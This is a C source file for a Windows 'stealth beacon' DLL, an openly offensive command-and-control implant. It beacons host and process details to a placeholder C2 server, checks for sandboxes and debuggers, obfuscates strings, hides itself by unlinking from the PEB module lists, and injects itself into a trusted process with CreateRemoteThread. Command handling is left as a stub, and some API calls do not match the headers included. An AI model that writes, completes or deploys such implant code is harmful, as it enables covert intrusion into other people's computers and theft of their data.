/*
 * Windows Stealth Beacon - C Implementation
 * Compile with MinGW: x86_64-w64-mingw32-gcc -shared -O2 -s -o beacon.dll beacon.c -lwininet -ladvapi32
 * Or MSVC: cl /LD /O2 /MT beacon.c wininet.lib advapi32.lib
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")

// ==================== CONFIGURATION ====================
#define C2_SERVER L"http://192.168.1.100:8080"  // PLACEHOLDER - Replace with actual C2
#define BEACON_ENDPOINT L"/beacon"
#define BOT_ID_ENDPOINT L"/register"
#define SLEEP_MIN 30000   // 30 seconds minimum
#define SLEEP_MAX 120000  // 2 minutes maximum
#define JITTER_FACTOR 0.3 // 30% jitter on top of random
// =======================================================

// Global state
HANDLE g_hStopEvent = NULL;
HANDLE g_hBeaconThread = NULL;
WCHAR g_szBotId[64] = {0};
volatile BOOL g_bRunning = TRUE;

// ==================== STEALTH UTILITIES ====================

/*
 * Generate a pseudo-unique bot ID based on machine SID + hostname
 * This persists across reboots but doesn't look like a random GUID
 */
void GenerateBotId(LPWSTR buffer, DWORD bufferSize) {
    WCHAR hostname[256];
    DWORD hostLen = sizeof(hostname) / sizeof(WCHAR);
    
    GetComputerNameW(hostname, &hostLen);
    
    // Get volume serial number as a hardware anchor
    DWORD serial = 0;
    GetVolumeInformationW(L"C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);
    
    // Create a hash-like string (not a real hash, just obfuscation)
    DWORD hash = 0;
    for (WCHAR* p = hostname; *p; p++) {
        hash = ((hash << 5) + hash) + *p;
    }
    hash ^= serial;
    hash = (hash ^ (hash >> 16)) & 0xFFFF;
    
    // Format as something that looks like a Windows Update ID
    swprintf(buffer, bufferSize, L"KB%08X-%04X", serial & 0xFFFFFFFF, hash);
}

/*
 * Simple XOR obfuscation for strings to avoid static analysis
 * Use this for any sensitive strings you don't want visible in strings.exe
 */
void XorDecrypt(char* data, size_t len, char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

/*
 * Check if running in a VM/sandbox (basic evasion)
 * Returns TRUE if we should abort
 */
BOOL IsSandboxed() {
    // Check for common VM artifacts
    if (GetModuleHandleW(L"sbiedll.dll") != NULL) return TRUE;  // Sandboxie
    
    // Check for debugger
    if (IsDebuggerPresent()) return TRUE;
    
    // Check physical memory (VM often < 2GB)
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE;
    
    // Check CPU cores (many sandboxes use 1-2 cores)
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) return TRUE;
    
    return FALSE;
}

/*
 * Hide this DLL from the PEB module list (anti-enumeration)
 * This is a classic technique - unlink the LDR_DATA_TABLE_ENTRY
 */
void HideFromPEB() {
    HMODULE hMod = NULL;
    PPEB peb = NULL;
    
    // Get current module handle (this DLL)
    hMod = GetModuleHandleW(L"beacon.dll");
    if (!hMod) return;
    
    // Get PEB
#if defined(_WIN64)
    peb = (PPEB)__readgsqword(0x60);
#else
    peb = (PPEB)__readfsdword(0x30);
#endif
    
    // Walk the InLoadOrderModuleList and unlink ourselves
    PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY entry = head->Flink;
    
    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY module = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        
        if (module->DllBase == hMod) {
            // Unlink from all three lists
            module->InLoadOrderLinks.Blink->Flink = module->InLoadOrderLinks.Flink;
            module->InLoadOrderLinks.Flink->Blink = module->InLoadOrderLinks.Blink;
            
            module->InMemoryOrderLinks.Blink->Flink = module->InMemoryOrderLinks.Flink;
            module->InMemoryOrderLinks.Flink->Blink = module->InMemoryOrderLinks.Blink;
            
            module->InInitializationOrderLinks.Blink->Flink = module->InInitializationOrderLinks.Flink;
            module->InInitializationOrderLinks.Flink->Blink = module->InInitializationOrderLinks.Blink;
            
            break;
        }
        entry = entry->Flink;
    }
}

// ==================== C2 COMMUNICATION ====================

/*
 * Register with C2 server, get or confirm bot ID
 */
BOOL RegisterWithC2() {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL success = FALSE;
    
    WCHAR fullUrl[512];
    WCHAR host[256] = {0};
    WCHAR path[256] = {0};
    URL_COMPONENTSW urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = host;
    urlComp.dwHostNameLength = sizeof(host)/sizeof(WCHAR);
    urlComp.lpszUrlPath = path;
    urlComp.dwUrlPathLength = sizeof(path)/sizeof(WCHAR);
    
    WinHttpCrackUrl(C2_SERVER, 0, 0, &urlComp);
    swprintf(fullUrl, 512, L"%s%s?bot=%s", C2_SERVER, BOT_ID_ENDPOINT, g_szBotId);
    
    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS, 0);
    
    if (hSession) {
        hConnect = WinHttpConnect(hSession, host, urlComp.nPort, 0);
        if (hConnect) {
            hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, 
                                          WINHTTP_NO_REFERER,
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
            if (hRequest) {
                if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                       WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
                    if (WinHttpReceiveResponse(hRequest, NULL)) {
                        DWORD statusCode = 0;
                        DWORD size = sizeof(statusCode);
                        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                           NULL, &statusCode, &size, NULL);
                        success = (statusCode == 200);
                    }
                }
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
    
    return success;
}

/*
 * Send a beacon to the C2 server
 * Includes: bot ID, timestamp, uptime, and process context info
 */
BOOL SendBeacon() {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL success = FALSE;
    
    // Build POST data
    WCHAR postData[1024];
    DWORD tickCount = GetTickCount();
    DWORD uptime = tickCount / 1000 / 60; // minutes
    
    WCHAR processName[MAX_PATH];
    GetModuleFileNameW(NULL, processName, MAX_PATH);
    WCHAR* shortName = wcsrchr(processName, L'\\');
    if (shortName) shortName++; else shortName = processName;
    
    DWORD sessionId;
    ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
    
    swprintf(postData, 1024, 
             L"bot=%s&uptime=%lu&tick=%lu&proc=%s&session=%lu",
             g_szBotId, uptime, tickCount, shortName, sessionId);
    
    // Crack URL for host/path
    URL_COMPONENTSW urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    WCHAR host[256] = {0};
    WCHAR path[256] = {0};
    urlComp.lpszHostName = host;
    urlComp.dwHostNameLength = sizeof(host)/sizeof(WCHAR);
    urlComp.lpszUrlPath = path;
    urlComp.dwUrlPathLength = sizeof(path)/sizeof(WCHAR);
    
    WinHttpCrackUrl(C2_SERVER, 0, 0, &urlComp);
    
    // Append endpoint to path
    WCHAR fullPath[512];
    swprintf(fullPath, 512, L"%s%s", path, BEACON_ENDPOINT);
    
    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS, 0);
    
    if (hSession) {
        hConnect = WinHttpConnect(hSession, host, urlComp.nPort, 0);
        if (hConnect) {
            hRequest = WinHttpOpenRequest(hConnect, L"POST", fullPath, NULL,
                                          WINHTTP_NO_REFERER,
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
            if (hRequest) {
                // Set content type for POST
                LPCWSTR headers = L"Content-Type: application/x-www-form-urlencoded\r\n";
                DWORD dataLen = (DWORD)(wcslen(postData) * sizeof(WCHAR));
                
                if (WinHttpSendRequest(hRequest, headers, (DWORD)wcslen(headers),
                                       postData, dataLen, dataLen, 0)) {
                    if (WinHttpReceiveResponse(hRequest, NULL)) {
                        DWORD statusCode = 0;
                        DWORD size = sizeof(statusCode);
                        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                           NULL, &statusCode, &size, NULL);
                        
                        // Check for commands in response body
                        if (statusCode == 200) {
                            DWORD bytesAvailable = 0;
                            if (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
                                char* response = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bytesAvailable + 1);
                                if (response) {
                                    DWORD bytesRead = 0;
                                    if (WinHttpReadData(hRequest, response, bytesAvailable, &bytesRead)) {
                                        // Process any C2 commands from response
                                        // (Implement command parsing here)
                                    }
                                    HeapFree(GetProcessHeap(), 0, response);
                                }
                            }
                            success = TRUE;
                        }
                    }
                }
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
    
    return success;
}

// ==================== MAIN BEACON LOOP ====================

DWORD WINAPI BeaconThread(LPVOID lpParam) {
    // Initial delay with jitter (avoid beaconing right after boot)
    Sleep(GetRandomDelay(SLEEP_MIN / 2, SLEEP_MIN));
    
    // Register with C2
    if (!RegisterWithC2()) {
        // If registration fails, still continue (maybe network down)
    }
    
    while (g_bRunning) {
        // Send beacon
        SendBeacon();
        
        // Calculate sleep with jitter
        DWORD baseSleep = GetRandomDelay(SLEEP_MIN, SLEEP_MAX);
        DWORD jitter = (DWORD)(baseSleep * ((double)rand() / RAND_MAX) * JITTER_FACTOR);
        DWORD sleepTime = baseSleep + jitter;
        
        // Sleep in small increments to allow clean shutdown
        DWORD slept = 0;
        while (slept < sleepTime && g_bRunning) {
            Sleep(1000);
            slept += 1000;
        }
    }
    
    return 0;
}

/*
 * Generate random delay between min and max (milliseconds)
 */
DWORD GetRandomDelay(DWORD minMs, DWORD maxMs) {
    // Seed with tick count + some entropy
    srand(GetTickCount() ^ (DWORD)GetCurrentProcessId());
    return minMs + (rand() % (maxMs - minMs + 1));
}

// ==================== PERSISTENCE / MIGRATION ====================

/*
 * Inject this DLL into a trusted system process
 * Uses simple CreateRemoteThread + LoadLibraryW (less stealthy but reliable)
 * For more stealth, implement manual mapping or use QueueUserAPC
 */
BOOL MigrateToProcess(LPCWSTR targetProcess) {
    HANDLE hProcess = NULL;
    LPVOID remoteMemory = NULL;
    HANDLE hThread = NULL;
    BOOL success = FALSE;
    
    // Get path to this DLL
    WCHAR dllPath[MAX_PATH];
    GetModuleFileNameW(GetModuleHandleW(L"beacon.dll"), dllPath, MAX_PATH);
    SIZE_T dllPathSize = (wcslen(dllPath) + 1) * sizeof(WCHAR);
    
    // Find target process
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
    
    PROCESSENTRY32W pe = {0};
    pe.dwSize = sizeof(pe);
    
    DWORD targetPid = 0;
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, targetProcess) == 0) {
                targetPid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    
    if (targetPid == 0) return FALSE;
    
    // Open target process
    hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                           PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                           FALSE, targetPid);
    if (!hProcess) return FALSE;
    
    // Allocate memory in target
    remoteMemory = VirtualAllocEx(hProcess, NULL, dllPathSize, 
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMemory) goto cleanup;
    
    // Write DLL path
    if (!WriteProcessMemory(hProcess, remoteMemory, dllPath, dllPathSize, NULL))
        goto cleanup;
    
    // Get LoadLibraryW address (same in all processes due to kernel32 base)
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    LPTHREAD_START_ROUTINE loadLibraryAddr = 
        (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
    
    // Create remote thread
    hThread = CreateRemoteThread(hProcess, NULL, 0, loadLibraryAddr, 
                                 remoteMemory, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, 5000);
        success = TRUE;
    }
    
cleanup:
    if (remoteMemory) VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
    if (hThread) CloseHandle(hThread);
    if (hProcess) CloseHandle(hProcess);
    
    return success;
}

// ==================== ENTRY POINT ====================

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hModule);
            
            // Anti-sandbox check
            if (IsSandboxed()) {
                return FALSE;
            }
            
            // Generate bot ID
            GenerateBotId(g_szBotId, sizeof(g_szBotId)/sizeof(WCHAR));
            
            // Hide from PEB (makes enumeration harder)
            HideFromPEB();
            
            // Create stop event
            g_hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
            
            // Start beacon thread
            g_hBeaconThread = CreateThread(NULL, 0, BeaconThread, NULL, 0, NULL);
            
            // Optionally migrate to a trusted process after initial beacon
            // Uncomment to auto-migrate:
            // if (GetModuleHandleW(L"rundll32.exe")) {
            //     MigrateToProcess(L"RuntimeBroker.exe");
            // }
            
            break;
            
        case DLL_PROCESS_DETACH:
            g_bRunning = FALSE;
            if (g_hStopEvent) SetEvent(g_hStopEvent);
            if (g_hBeaconThread) {
                WaitForSingleObject(g_hBeaconThread, 5000);
                CloseHandle(g_hBeaconThread);
            }
            if (g_hStopEvent) CloseHandle(g_hStopEvent);
            break;
            
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
